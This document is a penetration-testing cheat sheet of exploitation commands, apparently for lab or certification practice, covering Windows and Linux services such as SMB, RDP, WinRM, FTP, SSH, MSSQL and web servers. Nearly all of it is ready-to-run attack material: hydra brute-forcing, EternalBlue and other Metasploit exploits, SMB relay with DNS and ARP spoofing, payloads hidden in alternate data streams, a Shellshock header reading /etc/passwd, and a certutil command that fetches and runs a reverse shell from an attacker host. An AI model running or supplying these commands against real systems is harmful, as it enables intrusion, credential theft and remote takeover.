# Exploitation

## Windows

#### IIS WebDav (80,443)
```bash
hydra -l <user> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <host> http-get /webdav

davtest -url http://<target>/webdav
davtest -auth <user>:<pass> -url http://<target>/webdav
cadaver http://<target>/webdav
put /usr/share/webshells/asp/webshell.asp

# ---

msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS <target>
set HttpUsername <user>
set HttpPassword <pass>
set PATH /webdav/metasploit%RAND%.asp
exploit
```

#### SMB (445) & NetBios(139)
```bash
nmap -p445 --script smb-protocols <target>

# ---

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://<target>

# ---

msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS <target>
set VERBOSE false
exploit

# ---

psexec <user>@<target>

# ---

use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser <user>
set SMBPass Pass123
exploit

# ---

# [EternalBlue]
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
run

# ---

# Linux Samba Exploit (is_known_pipename) 3.5.0 to 4.4.14, 4.5.10, and 4.6.4
msfconsole -q
use exploit/linux/samba/is_known_pipename
set RHOST <target>
exploit

# ---
searchsploit samba 3.0.20
use exploit/multi/samba/usermap_script
set RHOSTS <target>
exploit
```

#### RDP (3389)
```bash
nmap -sV -p3389 <target>

# ---

msfconsole -q
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <target>
set RPORT <port>
exploit

# ---

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target> -s <port>

# ---

xfreerdp /u:<user> /p:<password> /v:<target>:<port>
```

#### WinRM (5985,5986)
```bash
crackmapexec winrm <target> -u <user> -p unix_passwords.txt
crackmapexec winrm <target> -u <user> -p <password> -x <cmd>

# ---

evil-winrm -u <user> -p <password> -i <target>

# ---

msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit

# ---

use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS <target>
set USERNAME <user>
set PASSWORD <password>
set CMD whoami
exploit

# ---

use exploit/windows/winrm/winrm_script_exec
set RHOSTS <target>
set USERNAME <user>
set PASSWORD <password>
set FORCE_VBS true
exploit
```

### DNS & SMB Relay Attack
- Step 1: Start msfconsole and configure the SMB Relay exploit
```bash
msfconsole -q
use exploit/windows/smb/smb_relay
set SRVHOST <attacker>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker>
set SMBHOST <target>
exploit
```
- Step 2: Configure `dnsspoof` in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain:
```bash
echo "<attacker_ip> *.sportsfoo.com" > fake_dns
dnsspoof -i <interface> -f fake_dns
```
- Step 3: Activate the MiTM using ARP Spoofing
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i <interface> -t <target_ip> <router_ip>
arpspoof -i <interface> -t <router_ip> <target_ip>
# We wait until we get an SMB connection
```

### Alternate Data Streams
```bash
cmd
notepad file.txt:secret.txt # Hide secret.txt behind file.txt
type payload.exe > windowslog.txt:evil.exe # Hide payload (evil.exe) behind windowslog.txt

mklink C:\\windows\\system32\\wpupdate.exe C:\\Temp\\windowslog.txt:evil.exe # Linking wpupdate.exe with evil.exe
wpupdate # Executing the malicious program
```

### HTTP (BadBlue 2.7)
```bash
msfconsole -q
search badblue
use badblue_passthru
set RHOSTS <target>
set LHOST <attacker>
set TARGET "BadBlue EE 2.7 Uneversal"
exploit
```

## Linux

### Shellshock
```bash
nmap --script http-shellshock --script-args "http-shellshock.uri=<uri>" <target>

# ---

burpsuite # User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

### FTP (21)
```bash
nmap -p 21 --script vuln <target>
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target>
exploit

# ---

msfconsole -q
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
run

# ---

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://<target> -t 4
```

### SSH (22)
```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target>
run

# ---

msfconsole -q
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS <target>
set SPAWN_PTY true
exploit

# ---

use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
run

# ---

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://<target> -t 4
```

### Samba (445)
```bash
enum4linux -u <target>
enum4linux -r -u <user> -p <pass> <target>

enum4linux -U <target>
enum4linux -S <target>
enum4linux -r -u <user> -p <pass> <target>
enum4linux -a -u <user> -p <pass> <target>
enum4linux -U -M -S -P -G <target>

# ---

msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <user>
set RHOSTS <target>
exploit

# ---

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://<target> -t 4

# ---

smbmap -u guest -p "" -H <target>
smbmap -u <user> -p <pass> -H <target>

## Run a command
smbmap -u <user> -p <pass> -H <target> -x 'ipconfig'
## List all drives
smbmap -u <user> -p <pass> -H <target> -L
## List dir content
smbmap -u <user> -p <pass> -H <target> -r 'C$'
## Upload a file
smbmap -u <user> -p <pass> -H <target> --upload '/root/backdoor' 'C$\backdoor'
## Download a file
smbmap -u <user> -p <pass> -H <target> --download 'C$\flag.txt'

# ---

smbclient -L <target> -U <user>
smbclient //<target>/<share> -U <user>

# ---

msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser <user>
set SMBPass <pass>
set RHOSTS <target>
exploit
```

### SNMP (161/162)
```bash
nmap -sU -p 161 <target>
nmap -sU -p 161 --script=snmp-brute <target>

# ---

snmpwalk -v 1 -c public <target>
```

### SMTP
```bash
# Haraka smtpd 2.8.8
msfconsole -q
use exploit/linux/smtp/haraka
set SRVPORT 9898
set EMAIL_TO root@attackdefense.test
set PAYLOAD linux/x64/meterpreter_reverse_http
set RHOST <target>
exploit
```

### HTTP (80,443)
- Rejetto HFS
```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target>
exploit
```
- Tomcat 8.5.19
```bash
msfconsole -q
search tomcat_jsp type:exploit
use exploit/http/tomcat_jsp_upload_bypass
set PAYLOAD java/jsp_shell_bind_tcp
set SHELL cmd
set RHOSTS <target>
exploit
```

### MySQL (3306)
```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target>
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

# ---

hydra -l <user> -P unix_passwords.txt mysql://<target> -t 4
```

### MSSQL (1433)
```bash
nmap -p 1433 --script ms-sql-empty-password <target>
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <target>
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<user>,mssql.password=<pass> <target>
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<user>,mssql.password=<pass>,ms-sql-xp-cmdshell.cmd="ipconfig" <target>

# ---

search mssql_login
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <target>
set USERNAME sa
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run

# ---

search mssql_exec
use auxiliary/admin/mssql/mssql_exec
set DATABASE master
set USERNAME sa
set PASSWORD <pass>
set RHOSTS <target>
set CMD cmd.exe /c "mkdir C:\tmp & certutil -urlcache -split -f http://<attacker>:8000/revshell.exe C:\tmp\revshell.exe & C:\tmp\revshell.exe"
```

### PHP (5.2.4)
```bash
searchsploit php cgi
msfconsole -q
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS <target>
run
```
